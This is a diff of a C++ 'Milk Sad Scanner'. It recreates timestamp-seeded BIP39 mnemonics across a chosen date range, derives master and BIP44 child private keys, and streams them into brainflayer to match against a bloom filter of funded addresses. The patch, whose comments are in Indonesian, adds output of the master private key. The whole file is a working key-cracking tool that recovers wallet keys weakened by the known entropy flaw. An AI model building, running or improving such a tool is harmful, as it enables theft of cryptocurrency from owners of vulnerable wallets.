@@ -1,13 +1,7 @@
 /**
  * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL)
- *
- * PATCH SUMMARY
- * -------------
- * ✔ Dual-chain scan m/44'/0'/0'/0/i and m/44'/0'/0'/1/i
- * ✔ Stable derivation count (retry invalid BIP32 children)
- * ✔ Reusable serialization buffer (avoid stack alloc)
- * ✔ Optimized CKDpriv
- * ✔ Memory-safe OpenSSL usage
+ * 
+ * Upgrade: mengirim master key + child key BIP44 ke brainflayer
  */
 
 #define _DEFAULT_SOURCE
@@ -228,45 +222,49 @@ std::string to_hex(const std::vector<uint8_t>& data){
 }
 
 // ================= WORKER =================
-void worker_process(int id,uint64_t start,uint64_t end,int step,
-                    const std::vector<std::string>& wordlist,int num_derivations){
+void worker_process(int id, uint64_t start, uint64_t end, int step,
+                    const std::vector<std::string>& wordlist, int num_derivations) {
 
     CryptoContext cc;
 
-    std::string log_file=OUTPUT_PREFIX+std::to_string(id)+".log";
-    std::string cmd=BRAINFLAYER_BIN+" -v -b "+BLOOM_FILTER+" -t priv -x > "+log_file;
+    std::string log_file = OUTPUT_PREFIX + std::to_string(id) + ".log";
+    std::string cmd = BRAINFLAYER_BIN + " -v -b " + BLOOM_FILTER + " -t priv -x > " + log_file;
 
-    FILE* pipe=popen(cmd.c_str(),"w");
-    if(!pipe) return;
+    FILE* pipe = popen(cmd.c_str(), "w");
+    if (!pipe) return;
 
     char buffer[4096];
-    setvbuf(pipe,buffer,_IOFBF,sizeof(buffer));
+    setvbuf(pipe, buffer, _IOFBF, sizeof(buffer));
 
-    const uint32_t H=0x80000000;
+    const uint32_t H = 0x80000000;
 
-    for(uint64_t ts=start; ts<=end && !g_stop_flag; ts+=step){
+    for (uint64_t ts = start; ts <= end && !g_stop_flag; ts += step) {
 
-        std::string m=generate_mnemonic_bip39((uint32_t)ts,wordlist);
-        auto seed=mnemonic_to_seed(m);
-        auto master=hd_master_key_from_seed(seed);
+        std::string m = generate_mnemonic_bip39((uint32_t)ts, wordlist);
+        auto seed = mnemonic_to_seed(m);
+        auto master = hd_master_key_from_seed(seed);
 
-        auto k44=CKDpriv_fast(master,44|H,cc);
-        auto kCoin=CKDpriv_fast(k44,0|H,cc);
-        auto kAcc=CKDpriv_fast(kCoin,0|H,cc);
+        // === KIRIM MASTER PRIVATE KEY ===
+        std::string master_hex = to_hex(master.key);
+        fprintf(pipe, "%s\n", master_hex.c_str());
 
-        for(uint32_t chain=0; chain<=1; ++chain){
+        auto k44 = CKDpriv_fast(master, 44 | H, cc);
+        auto kCoin = CKDpriv_fast(k44, 0 | H, cc);
+        auto kAcc = CKDpriv_fast(kCoin, 0 | H, cc);
 
-            auto kChange=CKDpriv_fast(kAcc,chain,cc);
-            if(!kChange.valid) continue;
+        for (uint32_t chain = 0; chain <= 1; ++chain) {
 
-            int derived=0;
-            uint32_t idx=0;
+            auto kChange = CKDpriv_fast(kAcc, chain, cc);
+            if (!kChange.valid) continue;
 
-            while(derived<num_derivations){
-                auto child=CKDpriv_fast(kChange,idx++,cc);
-                if(!child.valid) continue;
-                std::string hex=to_hex(child.key);
-                fprintf(pipe,"%s\n",hex.c_str());
+            int derived = 0;
+            uint32_t idx = 0;
+
+            while (derived < num_derivations) {
+                auto child = CKDpriv_fast(kChange, idx++, cc);
+                if (!child.valid) continue;
+                std::string hex = to_hex(child.key);
+                fprintf(pipe, "%s\n", hex.c_str());
                 derived++;
             }
         }
@@ -275,44 +273,46 @@ void worker_process(int id,uint64_t start,uint64_t end,int step,
 }
 
 // ================= MAIN =================
-int main(){
+int main() {
 
-    signal(SIGINT,signal_handler);
+    signal(SIGINT, signal_handler);
 
-    if(!file_exists(BRAINFLAYER_BIN)||!file_exists(BLOOM_FILTER)){
-        std::cerr<<"Missing files\n";
+    if (!file_exists(BRAINFLAYER_BIN) || !file_exists(BLOOM_FILTER)) {
+        std::cerr << "Missing files\n";
         return 1;
     }
 
-    auto wordlist=load_wordlist(WORDLIST_FILE);
+    auto wordlist = load_wordlist(WORDLIST_FILE);
 
-    std::string s,e;
-    std::cout<<"Start Date YYYY-MM-DD: "; std::cin>>s;
-    std::cout<<"End Date YYYY-MM-DD: "; std::cin>>e;
+    std::string s, e;
+    std::cout << "Start Date YYYY-MM-DD: "; std::cin >> s;
+    std::cout << "End Date YYYY-MM-DD: "; std::cin >> e;
 
-    struct tm tm1{},tm2{};
-    strptime((s+" 00:00:00").c_str(),"%Y-%m-%d %H:%M:%S",&tm1);
-    strptime((e+" 23:59:59").c_str(),"%Y-%m-%d %H:%M:%S",&tm2);
+    struct tm tm1{}, tm2{};
+    strptime((s + " 00:00:00").c_str(), "%Y-%m-%d %H:%M:%S", &tm1);
+    strptime((e + " 23:59:59").c_str(), "%Y-%m-%d %H:%M:%S", &tm2);
 
-    uint64_t start=timegm(&tm1);
-    uint64_t end=timegm(&tm2);
+    uint64_t start = timegm(&tm1);
+    uint64_t end = timegm(&tm2);
 
     int threads;
-    std::cout<<"Threads: "; std::cin>>threads;
+    std::cout << "Threads: "; std::cin >> threads;
 
     g_child_pids.resize(threads);
 
-    for(int i=0;i<threads;i++){
-        pid_t pid=fork();
-        if(pid==0){
-            worker_process(i,start+i,end,threads,wordlist,5);
+    for (int i = 0; i < threads; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            worker_process(i, start + i, end, threads, wordlist, 5);
             exit(0);
-        }else g_child_pids[i]=pid;
+        } else {
+            g_child_pids[i] = pid;
+        }
     }
 
     int status;
-    while(wait(&status)>0);
+    while (wait(&status) > 0);
 
-    std::cout<<"Done\n";
+    std::cout << "Done\n";
     return 0;
 }
